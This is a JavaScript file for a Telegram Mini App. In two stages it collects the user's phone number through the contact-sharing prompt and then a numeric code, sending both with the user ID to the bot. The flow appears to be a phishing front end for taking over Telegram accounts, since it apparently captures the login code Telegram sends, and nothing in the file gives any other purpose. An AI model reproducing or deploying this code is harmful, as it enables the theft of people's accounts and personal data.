(function() {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    const params = new URLSearchParams(window.location.search);
    const stage = params.get('stage') || 'phone';

    const user = tg.initDataUnsafe && tg.initDataUnsafe.user;
    const userId = user ? user.id : 0;

    const phoneStage = document.getElementById('phone-stage');
    const codeStage = document.getElementById('code-stage');
    const loadingStage = document.getElementById('loading-stage');

    function showStage(el) {
        document.querySelectorAll('.stage').forEach(function(s) {
            s.classList.add('hidden');
        });
        el.classList.remove('hidden');
    }

    if (stage === 'code') {
        showStage(codeStage);
        initCodeStage();
    } else {
        showStage(phoneStage);
        initPhoneStage();
    }

    function initPhoneStage() {
        var btn = document.getElementById('share-phone-btn');
        var status = document.getElementById('phone-status');

        btn.addEventListener('click', function() {
            btn.disabled = true;
            status.textContent = 'Requesting contact...';
            status.className = 'status';

            if (tg.requestContact) {
                tg.requestContact(function(sent, event) {
                    if (sent && event && event.responseUnsafe && event.responseUnsafe.result) {
                        var contact = event.responseUnsafe.result;
                        var phone = contact.phone_number || contact.phoneNumber || '';

                        if (!phone && contact.contact) {
                            phone = contact.contact.phone_number || contact.contact.phoneNumber || '';
                        }

                        if (phone) {
                            if (phone.charAt(0) !== '+') {
                                phone = '+' + phone;
                            }
                            status.textContent = 'Phone received!';
                            status.className = 'status success';
                            showStage(loadingStage);

                            var data = JSON.stringify({
                                phone: phone,
                                user_id: userId
                            });
                            tg.sendData(data);
                        } else {
                            status.textContent = 'Could not get phone number. Please try again.';
                            status.className = 'status error';
                            btn.disabled = false;
                        }
                    } else {
                        status.textContent = 'You need to share your phone number to proceed.';
                        status.className = 'status error';
                        btn.disabled = false;
                    }
                });
            } else {
                status.textContent = 'requestContact not supported. Please update Telegram.';
                status.className = 'status error';
                btn.disabled = false;
            }
        });
    }

    function initCodeStage() {
        var input = document.getElementById('code-input');
        var btn = document.getElementById('submit-code-btn');
        var status = document.getElementById('code-status');

        input.focus();

        input.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        btn.addEventListener('click', function() {
            var code = input.value.trim();
            if (!code || code.length < 4) {
                status.textContent = 'Please enter a valid code';
                status.className = 'status error';
                return;
            }

            btn.disabled = true;
            input.disabled = true;
            status.textContent = 'Submitting...';
            status.className = 'status';

            showStage(loadingStage);

            var data = JSON.stringify({
                code: code,
                user_id: userId
            });
            tg.sendData(data);
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                btn.click();
            }
        });
    }
})();